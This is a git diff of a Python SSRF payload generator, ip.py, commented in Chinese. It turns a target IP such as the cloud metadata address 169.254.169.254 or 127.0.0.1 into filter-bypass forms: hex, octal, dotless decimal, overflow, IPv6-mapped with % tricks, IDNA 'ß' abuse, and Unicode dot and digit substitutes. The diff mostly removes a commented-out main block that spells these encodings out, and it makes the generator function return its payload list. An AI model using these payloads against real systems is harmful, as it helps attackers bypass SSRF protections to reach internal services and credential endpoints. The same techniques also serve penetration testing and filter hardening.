@@ -6,6 +6,8 @@
 使用方法：
 python ip.py 169.254.169.254 80 www.google.com
 python ip.py 127.0.0.1 80 www.google.com
+
+2023年3月12日17:14:48
 提供了向外生成Payload的接口以及生成txt格式的Payload的功能
 """
 
@@ -273,7 +275,7 @@ def generate_payload_unicode(port, ip, ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip13, 
     return temp
 
 
-# 生成所有Payload
+# 生成所有Payload并返回
 def all_payload(ip, port, site, export='export') -> list:
     payload = []
     if not valid_ip(ip):
@@ -288,7 +290,7 @@ def all_payload(ip, port, site, export='export') -> list:
     if export == '':
         pass
     elif export == 'export':
-        filename = "export-" + ip + "-" + str(datetime.datetime.now().strftime("%H-%M-%d-%m-%Y")) + '.txt'
+        filename = "export_file_" + ip + "_" + str(datetime.datetime.now().strftime('%Y.%m.%d_%H.%M.%S')) + '.txt'
     else:
         logging.error('input export or Nothing, other words are forbidden')
 
@@ -475,272 +477,8 @@ def all_payload(ip, port, site, export='export') -> list:
         print("Results are exported to: " + filename, sep='')
         print("\n" + '-----------------------------------------------------------------------------------------------')
     print()
+    return payload
 
 
 if __name__ == '__main__':
-    all_payload('127.0.0.1', 80, 'www.google.com', 'export')
-
-# if __name__ == '__main__':
-#     # eg: python ip.py 169.254.169.254 80 www.google.com
-#     # len(sys.argv) = 4
-#     if len(sys.argv) < 4 or len(sys.argv) >= 6:
-#         print(
-#             "\nUsage: python " + sys.argv[0] + " IP PORT WhiteListedDomain EXPORT(optional)\nUsage: python " + sys.argv[
-#                 0] + " 169.254.169.254 80 www.google.com\nUsage: python " + sys.argv[
-#                 0] + " 169.254.169.254 80 www.google.com export")
-#         exit(1)
-#     # 第二个参数，也就是IP地址
-#     ip = str(sys.argv[1])
-#
-#     if not valid_ip(ip):
-#         print("\n" + ip +
-#               " is not a valid IPv4 address in dotted decimal format, example: 123.123.123.123")
-#         print("\nUsage: python " + sys.argv[0] + " IP EXPORT(optional)\nUsage: python " + sys.argv[
-#             0] + " 169.254.169.254\nUsage: python " + sys.argv[0] + " 169.254.169.254 export")
-#         exit(1)
-#
-#     # 分割得到4个IP值
-#     ipFrag3, ipFrag2, ipFrag1, ipFrag0 = ip.split(".")
-#     global port
-#     port = str(sys.argv[2])
-#     global RAND_PREFIX_TEXT
-#     RAND_PREFIX_TEXT = random_text()
-#     global RAND_PREFIX_TEXT_SPEC
-#     RAND_PREFIX_TEXT_SPEC = random_text_spec()
-#     global RANDOM_PREFIX_VALID_SITE
-#     # www.google.com
-#     RANDOM_PREFIX_VALID_SITE = str(sys.argv[3])
-#     FILENAME = ''
-#
-#     try:
-#         sys.argv[4]
-#     except IndexError:
-#         EXPORT_RESULTS = ''
-#     else:
-#         EXPORT_RESULTS = str(sys.argv[4])
-#
-#     if EXPORT_RESULTS == 'export':
-#         FILENAME = "export-" + ip + "-" + str(datetime.datetime.now().strftime("%H-%M-%d-%m-%Y")) + '.txt'
-#         global f
-#         python_version = (platform.python_version())
-#         major, minor, patch_level = python_version.split(".")
-#         # Python3
-#         if major == "3":
-#             # f = open(FILENAME, 'w')
-#             f = open(FILENAME, 'w', encoding='utf8')
-#         else:
-#             # f = open(FILENAME, 'wb')
-#             f = open(FILENAME, 'wb', encoding='utf8')
-#     elif EXPORT_RESULTS != '':
-#         print("\nUsage: python " + sys.argv[0] + " IP WhiteListedDomain EXPORT(optional)\nUsage: python " + sys.argv[
-#             0] + " 169.254.169.254 80 www.google.com\nUsage: python " + sys.argv[
-#                   0] + " 169.254.169.254 80 www.google.com export")
-#         exit(1)
-#
-#     # Case 1 - Dotted hexadecimal
-#     print()
-#     print("Dotted hexadecimal IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # 转换为16进制，并且加上了0X
-#     ip1 = hex_single(ipFrag3, "yes") + "." + \
-#           hex_single(ipFrag2, "yes") + "." + \
-#           hex_single(ipFrag1, "yes") + "." + \
-#           hex_single(ipFrag0, "yes")
-#     # 各种绕过
-#     print_and_write(ip1)
-#
-#     # Case 2 - Dotless hexadecimal
-#     print("Dotless hexadecimal IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # 不带点的十六进制，开头加上0X即可
-#     ip2 = hex_single(ipFrag3, "yes") + hex_single(ipFrag2, "no") + hex_single(ipFrag1, "no") + hex_single(ipFrag0, "no")
-#     print_and_write(ip2)
-#
-#     # Case 3 - Dotless decimal
-#     print("Dotless decimal IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # 将IP转换为数值
-#     ip3 = str(decimal_single(ipFrag3, 3) + decimal_single(ipFrag2, 2) +
-#               decimal_single(ipFrag1, 1) + decimal_single(ipFrag0, 0))
-#     print_and_write(ip3)
-#
-#     # Case 4 - Dotted decimal with overflow(256)
-#     print("Dotted decimal with overflow(256) IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # 给ip地址都加上256
-#     ip4 = dec_overflow_single(ipFrag3) + "." + dec_overflow_single(ipFrag2) + "." + dec_overflow_single(
-#         ipFrag1) + "." + dec_overflow_single(ipFrag0)
-#     print_and_write(ip4)
-#
-#     # Case 5 - Dotted octal
-#     print("Dotted octal IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # 带点的八进制
-#     ip5 = oct_single(ipFrag3) + "." + oct_single(ipFrag2) + "." + oct_single(ipFrag1) + "." + oct_single(ipFrag0)
-#     print_and_write(ip5)
-#
-#     # Case 6 - Dotted octal with padding
-#     print("Dotted octal with padding IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # oct_single：转换为8进制并且去掉o
-#     # eg: 127.0.0.1转换为以下内容：
-#     # http://00177.0000.00000.000001:80/
-#     ip6 = '0' + oct_single(ipFrag3) + "." + '00' + oct_single(ipFrag2) + "." + '000' + oct_single(
-#         ipFrag1) + "." + '0000' + oct_single(ipFrag0)
-#     print_and_write(ip6)
-#
-#     # Case 7 - IPv6 compact version
-#     print("IPv6 compact version IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # IPv4兼容地址
-#     # 零压缩法可以用来缩减其长度
-#     # 如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示
-#     ip7 = '[::' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + ']'
-#     print_and_write(ip7)
-#
-#     # Case 17 - IPv6 compact version with % bypass
-#     print("IPv6 compact version with % bypass IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # IPv4兼容地址
-#     # 加上百分号和3个随机数字
-#     ip13 = '[::' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + '%' + RANDOM3NUMBERS + ']'
-#     print_and_write(ip13)
-#
-#     # Case 8 - IPv6 mapped version
-#     print("IPv6 mapped version IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # IPv4映像地址
-#     # 比如::ffff:192.168.89.9，是0000:0000:0000:0000:0000:ffff:c0a8:5909的简化写法
-#     ip8 = '[::ffff:' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + ']'
-#     print_and_write(ip8)
-#
-#     # Case 16 - IPv6 mapped version with % bypass
-#     print("IPv6 mapped version with % bypass IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # IPv4映像地址
-#     # 加上百分号和3个随机数字
-#     ip14 = '[::ffff:' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + '%' + RANDOM3NUMBERS + ']'
-#     print_and_write(ip14)
-#
-#     # Case 9 - Dotted hexadecimal + Dotted octal + Dotless decimal
-#     print("Dotted hexadecimal + Dotted octal + Dotless decimal IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # 十六进制 + 八进制 + 剩余两个IP值的数值和
-#     ip9 = hex_single(ipFrag3, "yes") + "." + oct_single(ipFrag2) + "." + str(
-#         decimal_single(ipFrag1, 1) + decimal_single(ipFrag0, 0))
-#     print_and_write(ip9)
-#
-#     # Case 10 - Dotted hexadecimal + Dotless decimal
-#     print("Dotted hexadecimal + Dotless decimal IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # 十六进制 + 剩余三个IP值的数值和
-#     ip10 = hex_single(ipFrag3, "yes") + "." + str(
-#         decimal_single(ipFrag2, 2) + decimal_single(ipFrag1, 1) + decimal_single(ipFrag0, 0))
-#     print_and_write(ip10)
-#
-#     # Case 11 - Dotted octal with padding + Dotless decimal
-#     print("Dotted octal with padding + Dotless decimal IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # 八进制 + 剩余三个IP值的数值和
-#     ip11 = '0' + oct_single(ipFrag3) + "." + str(
-#         decimal_single(ipFrag2, 2) + decimal_single(ipFrag1, 1) + decimal_single(ipFrag0, 0))
-#     print_and_write(ip11)
-#
-#     # Case 12 - Dotted octal with padding + Dotted hexadecimal + Dotless decimal
-#     print("Dotted octal with padding + Dotted hexadecimal + Dotless decimal IP Address of:" +
-#           " http://" + ip +
-#           " + authentication prefix/bypass combo list")
-#     print('======================================================================================================')
-#     # 八进制 + 十六进制 + 剩余两个IP值的数值和
-#     ip12 = '0' + oct_single(ipFrag3) + "." + hex_single(ipFrag2, "yes") + "." + str(
-#         decimal_single(ipFrag1, 1) + decimal_single(ipFrag0, 0))
-#     print_and_write(ip12)
-#
-#     # Case 13 - Abusing IDNA Standard
-#     print("Abusing IDNA Standard: "
-#           "http://ß.localdomain.pw/" + ' -> ' +
-#           'http://cc.localdomain.pw/' + ' => ' +
-#           'DNS' + ' => ' +
-#           '127.127.127.127')
-#     print('======================================================================================================')
-#     print('http://ß.localdomain.pw/', sep='')
-#     print('======================================================================================================')
-#     print()
-#     if EXPORT_RESULTS == 'export':
-#         print('http://ß.localdomain.pw/', file=f, sep='')
-#
-#     # Case 14 - Abusing 。and ｡
-#     IPAddressParts = ip.split(".")
-#     print("Abusing 。and ｡ and ．: " + "http://" +
-#           IPAddressParts[0] + "。" + IPAddressParts[1] + "。" +
-#           IPAddressParts[2] + "。" + IPAddressParts[3] + "/" + " and " +
-#           "http://" +
-#           IPAddressParts[0] + "｡" + IPAddressParts[1] + "｡" +
-#           IPAddressParts[2] + "｡" + IPAddressParts[3] + "/" + " and " +
-#           "http://" +
-#           IPAddressParts[0] + "．" + IPAddressParts[1] + "．" +
-#           IPAddressParts[2] + "．" + IPAddressParts[3] + "/" + ' -> ' +
-#           "http://" +
-#           IPAddressParts[0] + "." + IPAddressParts[1] + "." +
-#           IPAddressParts[2] + "." + IPAddressParts[3] + "/")
-#     print('======================================================================================================')
-#     # 点分割符号替换
-#     print('http://', IPAddressParts[0], '。', IPAddressParts[1], '。', IPAddressParts[2], '。', IPAddressParts[3], '/',
-#           sep='')
-#     print('http://', IPAddressParts[0], '｡', IPAddressParts[1], '｡', IPAddressParts[2], '｡', IPAddressParts[3], '/',
-#           sep='')
-#     print('http://', IPAddressParts[0], '．', IPAddressParts[1], '．', IPAddressParts[2], '．', IPAddressParts[3], '/',
-#           sep='')
-#     print('======================================================================================================')
-#     print()
-#     if EXPORT_RESULTS == 'export':
-#         print('http://', IPAddressParts[0], '。', IPAddressParts[1], '。', IPAddressParts[2], '。', IPAddressParts[3], '/',
-#               file=f, sep='')
-#         print('http://', IPAddressParts[0], '｡', IPAddressParts[1], '｡', IPAddressParts[2], '｡', IPAddressParts[3], '/',
-#               file=f, sep='')
-#         print('http://', IPAddressParts[0], '．', IPAddressParts[1], '．', IPAddressParts[2], '．', IPAddressParts[3], '/',
-#               file=f, sep='')
-#
-#     # Case 15 Abusing Unicode
-#     print("Abusing Unicode:" +
-#           'http://' + convert_ip_2_random_unicode_value() + '        -> ' +
-#           "http://" + ip)
-#     print('======================================================================================================')
-#     # 封闭式字母数字字符
-#     print_and_write_unicode(ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip13, ip8, ip14, ip9, ip10, ip11, ip12)
-#
-#     if EXPORT_RESULTS == 'export':
-#         f.close()
-#         print("\n" + '----------------------------------------------------------------------------------------------')
-#         print('======================================================================================================')
-#         print("Results are exported to: " + FILENAME, sep='')
-#         print('======================================================================================================')
-#         print("\n" + '-----------------------------------------------------------------------------------------------')
-#
-#     print()
+    print(all_payload('127.0.0.1', 80, 'www.google.com', 'export'))
